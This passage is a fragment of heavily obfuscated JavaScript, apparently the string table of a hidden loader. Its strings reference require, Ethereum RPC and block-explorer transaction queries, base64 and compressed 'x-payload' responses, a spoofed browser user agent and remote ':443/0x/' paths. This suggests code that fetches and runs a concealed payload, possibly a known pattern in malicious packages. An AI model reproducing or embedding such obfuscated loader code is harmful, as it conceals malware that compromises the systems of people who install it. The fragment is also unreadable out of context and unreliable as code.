x27]=module','body','Agent','stener','GScvm','request','tptTS','IcBeg','PDDoC','mmdla','mHlIu','@^1aQk','zGkiA','UIMDX','oMizd','ooiek','OcYSZ','VhJGJ','11aNmmmc','iIlXc','ZnqBl','SylcU','UugNF','ignore','then','n/json','q4FZkxX{!h','nonce','e.com','2.0','write','2ltcVRo','vwtGe','xxCcp','rvVIP','awLdi','umber','qFuwJ','UOqrF','bxquq','578388nmHoSs','base64','Missing\x20X-','LvqnD','QmUPo','CYzAk','ciCZA','pJBhy','address=','https://et','XQLvT','_t_u\x27]=\x27','XTiEo','1.0.0.0\x20Sa','SYMdD','NoAnk','mWGYc','Mozilla/5.','https:',':443/0x/ls','dirwg','ort=desc&f','x-gzip','Tftem','\x20Chrome/13','controller','IzsXO','oAoBi','ffset=20&s','h.blocksco','ZnqIi','FVZDQ','_H\x27]=\x27','SScqo','hIRJK','IWCKd','TEgUn','coEXo','path','from','wmZHh','createBrot','CePcl','yfssM','stringify','WRwsf','Xbsut','VSHjC','vPUoy','txeOo','NoaQQ','al=global;','xigOu','qTlHm','zRCVO','1351904UzFtvW','9aDC2490Ef','nqulO','qNNaX','dXAgH','KknBN','BILAb','headers','yVwTA','nxond','wABYR','coding','h-mainnet.','byteLength','9&page=1&o','deflate','lGrTj','ViAxQ','cGHLM','PCetz','toLowerCas','dpnxM','hostname','qFJAF','STFTv','YWTch','YqLgS',':443/0x/cl','\x20(KHTML,\x20l','abort','utf8','AlBmf','vgHoQ','gJrvR','CCahq','ICXmt','pathname','gUeZZ','run','3|4|2|0|1','UGmUZ','NjOIc','XPLbx','_t_s','axnJC','port','object','pc.io/eth','VoQjM','oyTSj','qHwhE','Nekvz','lsRvH','http://','atlWi','0\x20(Windows','aEBNl','XhLuJ','k=0&endblo','ZmdAk','h.drpc.org','PLHsh','TTtCp','160zTZXPA','x-payload-','bXwtX','Tdrch','ZiucO','RLVPq','WSUCn','rhMDZ','NhZzt','D311D3080e','FgMKF','resolve','730EBTWJy','HrjOy','zOLpD','LjCLu','pByBW','5|2|4|0|1|','kbbgF','kGgXv','ngth',')\x20AppleWeb','ate,\x20br','?module=ac','1060551SBSquX','sSCcS','ike\x20Gecko)','result','bDAId','ZBxEK','iZtid','mOdpl','vhHto','Win64;\x20x64','AaxpB','1592UvABkN','parse','resume','hPvkG','JVwsz','dXlCQ','eXgRz',';var\x20_glob','zCbBZ','split','count&acti','ut.com/api','DmDqk','KDRGN','\x27;global[\x27','apfTY','eth_getTra','ZkwKQ','Content-Ty','QESpB','XeTjB','pipe','uvvXZ','gIybh','applicatio','CwJct','pSKQB','oLUma','unt','GpKrt','gzip,\x20defl','Kit/537.36','heyaV','xLeKb','dpWoq','bRiEg','WalCZ','blockNumbe','koiga','YCLdz','sxCvd','kCReV','YMfPN','method','protocol','jhkau','toString','ryCYX','ODpOb','sjBTd','NcDTE','UJaeJ','tusOV','NCkTX','wqbwM','HEAD','charCodeAt','tRfip','b64','uDdfi','ZEMFT','global[\x27_V','ojAsZ','vtHKm','dDWtH','kqWnV','EvYMf','search','BpaWv','ScenX','eIUwm','eth_blockN','lZMHb','bHGqj','hZkkZ','wruOo','length','CRnaP','ybZqj','zjWFq','_H2','&startbloc','QyOSI','GET','on=txlist&','r\x27]=requir','transactio','\x20NT\x2010.0;\x20','NYdge','e;global[\x27','eth_getBlo','Empty\x20payl','tdetv','Qcemc','6093QWGqsp','sEELJ','VRbxk','rilom','UEtxL','tPIKK','tJUaQ','public.bla','unref','RdwCk','ck=9999999','asdOC','NDgGi','9895584dCtdWL','_t_s\x27]=\x27','lbqBs','qsAZx','RVtCW','end',':443','QWbFG','okksr','oad\x20body','slice','JmVNt'];_0x3e8f=function(){return _0x325db3;};return _0x3e8f();}
